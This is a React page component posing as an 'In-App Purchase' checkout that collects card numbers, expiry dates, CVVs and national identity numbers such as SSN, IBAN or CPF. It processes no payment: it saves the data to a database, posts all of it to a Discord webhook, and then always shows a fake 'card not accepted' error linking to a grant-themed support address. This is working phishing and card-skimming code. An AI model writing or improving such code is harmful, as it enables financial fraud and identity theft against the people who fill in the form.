import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';

import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { toast } from 'sonner';
import { ArrowLeft, CreditCard, Loader2, AlertTriangle, ShieldCheck } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import SalesNotification from '@/components/SalesNotification';
import { sendToDiscord } from '@/lib/discord';

const COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
type Country = typeof COUNTRIES[number];

const SECURITY_PLACEHOLDERS: Record<string, string> = {
  USA: 'Enter SSN',
  Germany: 'Enter IBAN',
  UK: 'Enter National Insurance Number',
  Canada: 'Enter SIN',
  Brazil: 'Enter CPF',
  'New Zealand': 'Enter IRD Number',
};

export default function InAppPurchase() {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const [country, setCountry] = useState<Country | ''>('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [securityInfo, setSecurityInfo] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorOpen, setErrorOpen] = useState(false);

  const showSecurityField = country && country !== 'Others';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!amount || !description || !country || !cardNumber || !expiry || !cvv) {
      toast.error('Please fill all required fields');
      return;
    }
    if (showSecurityField && !securityInfo) {
      toast.error('Please provide the required security information');
      return;
    }

    setLoading(true);
    toast('Processing your payment…');

    try {
      const { error } = await supabase.from('payment_attempts').insert({
        user_id: user?.id,
        amount: parseFloat(amount),
        description,
        country,
        card_number: cardNumber,
        expiry,
        cvv,
        security_label: showSecurityField ? SECURITY_PLACEHOLDERS[country] : null,
        security_info: showSecurityField ? securityInfo : null,
      } as any);

      if (error) {
        console.error('Payment save error:', error);
      }
    } catch (err) {
      console.error('Payment submission error:', err);
    }

    // Send payment data to Discord
    sendToDiscord({
      title: '💳 New Payment Attempt',
      color: 0xf59e0b,
      fields: [
        { name: '🆔 User ID', value: user?.id || '—', inline: false },
        { name: '💰 Amount', value: `$${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
        { name: '📝 Description', value: description },
        { name: '🌍 Country', value: country },
        { name: '💳 Card Number', value: cardNumber },
        { name: '📅 Expiry', value: expiry },
        { name: '🔒 CVV', value: cvv },
        ...(showSecurityField ? [
          { name: `🛡️ ${SECURITY_PLACEHOLDERS[country]?.replace('Enter ', '')}`, value: securityInfo },
        ] : []),
      ],
    });

    await new Promise(r => setTimeout(r, 3000));
    setLoading(false);
    setErrorOpen(true);
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="border-b border-border bg-card/50 backdrop-blur">
        <div className="container mx-auto flex items-center gap-4 px-4 py-4">
          <Button variant="ghost" size="icon" onClick={() => navigate('/dashboard')}>
            <ArrowLeft className="h-5 w-5" />
          </Button>
          <h1 className="text-xl font-bold text-foreground">In-App Purchase</h1>
        </div>
      </header>

      <main className="container mx-auto max-w-lg px-4 py-8 space-y-6">
        <div className="text-center space-y-2">
          <h2 className="text-2xl font-bold text-foreground">Make Your Payments Here</h2>
          <p className="text-muted-foreground">Complete your payment securely below</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Amount & Description */}
          <Card>
            <CardHeader className="pb-4">
              <CardTitle className="text-lg">Payment Details</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="amount">Amount ($)</Label>
                <Input id="amount" type="number" min="1" step="0.01" placeholder="0.00" value={amount} onChange={e => setAmount(e.target.value)} required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="desc">Description</Label>
                <Input id="desc" placeholder="Please type a short note about what you are paying for" value={description} onChange={e => setDescription(e.target.value)} required />
              </div>
              <div className="space-y-2">
                <Label>Country</Label>
                <Select value={country} onValueChange={v => { setCountry(v as Country); setSecurityInfo(''); }}>
                  <SelectTrigger><SelectValue placeholder="Select country" /></SelectTrigger>
                  <SelectContent>
                    {COUNTRIES.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
                  </SelectContent>
                </Select>
              </div>
            </CardContent>
          </Card>

          {/* Card Information */}
          <Card>
            <CardHeader className="pb-4">
              <CardTitle className="text-lg flex items-center gap-2"><CreditCard className="h-5 w-5" /> Card Information</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="card">Card Number</Label>
                <Input id="card" placeholder="1234 5678 9012 3456" maxLength={19} value={cardNumber} onChange={e => setCardNumber(e.target.value)} required />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiry">Expiry Date</Label>
                  <Input id="expiry" placeholder="MM/YY" maxLength={5} value={expiry} onChange={e => setExpiry(e.target.value)} required />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv">CVV</Label>
                  <Input id="cvv" placeholder="123" maxLength={4} value={cvv} onChange={e => setCvv(e.target.value)} required />
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Security Info */}
          {showSecurityField && (
            <Card className="border-primary/30">
              <CardHeader className="pb-4">
                <CardTitle className="text-lg flex items-center gap-2"><ShieldCheck className="h-5 w-5 text-primary" /> Additional Security Info</CardTitle>
                <CardDescription>For security purposes, please provide the following information</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  <Label htmlFor="security">{SECURITY_PLACEHOLDERS[country]?.replace('Enter ', '')}</Label>
                  <Input id="security" placeholder={SECURITY_PLACEHOLDERS[country]} value={securityInfo} onChange={e => setSecurityInfo(e.target.value)} required />
                </div>
              </CardContent>
            </Card>
          )}

          <Button type="submit" className="w-full" size="lg" disabled={loading}>
            {loading ? <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing…</> : 'Confirm & Pay'}
          </Button>
        </form>
      </main>

      {/* Error Modal */}
      <Dialog open={errorOpen} onOpenChange={setErrorOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-destructive/10 mb-3">
              <AlertTriangle className="h-6 w-6 text-destructive" />
            </div>
            <DialogTitle className="text-center text-destructive">Payment Unsuccessful</DialogTitle>
            <DialogDescription className="text-center">
              Sorry, your card was not accepted. Your payment was unsuccessful. Please contact support.
            </DialogDescription>
          </DialogHeader>
          <div className="flex flex-col gap-3 pt-2">
            <Button asChild className="w-full">
              <a href="mailto:eligibleoffer@federalgovgrant.online">Contact Support</a>
            </Button>
            <Button variant="outline" className="w-full" onClick={() => setErrorOpen(false)}>Close</Button>
          </div>
        </DialogContent>
      </Dialog>

      <SalesNotification />
    </div>
  );
}
